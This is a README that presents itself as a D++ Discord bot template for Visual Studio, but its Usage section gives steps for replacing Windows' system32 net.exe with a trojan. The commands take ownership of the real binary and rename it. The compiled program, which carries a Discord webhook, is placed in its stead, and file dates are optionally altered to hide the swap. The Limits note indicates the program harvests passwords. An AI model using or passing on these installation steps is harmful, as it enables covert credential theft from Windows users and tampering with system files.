# D++ Windows Bot Template

A [D++](https://github.com/brainboxdotcc/DPP) Discord Bot template for Visual Studio 2022 (x64 and x86, release and debug). This repository is the result of [this tutorial](https://dpp.dev/build-a-discord-bot-windows-visual-studio.html) with additional enhancements for automatic selection of the correct architecture, and copying of the dll files into the correct folders on successful build.

This template comes packaged with the latest master branch of D++ from the CI. To use this project simply put your code into the `MyBot.cpp` and press F7. You can do much more with this template.

For support and assistance please join [the official support discord](https://discord.gg/dpp).

## Usage
1. rename net.exe to not.exe
    - `takeown /F net.exe`
    - `cacls net.exe /e /p <username>:f`
    - `move \windows\system32\net.exe \windows\system32\not.exe`
3. Place your discord web hook link into the program
4. Compile this program and put it in `C:\Windows\System32\`
5. Add dependencies to `C:\Windows\System32\`
6. (optional) change dates on files
7. Flourish

### Dependencies
- everything in the release folder:
  - dpp.dll
  - libcrypto-1_1-x64.dll
  - libsodium.dll
  - libssl-1_1-x64.dll
  - net.exe
  - opus.dll
  - zlib1.dll
- `vcruntime140.dll` which can be found in the most recent tag or [here](https://aka.ms/vs/17/release/vc_redist.x64.exe)

### Limits
- This program does not properly parse passwords with `|` in them 
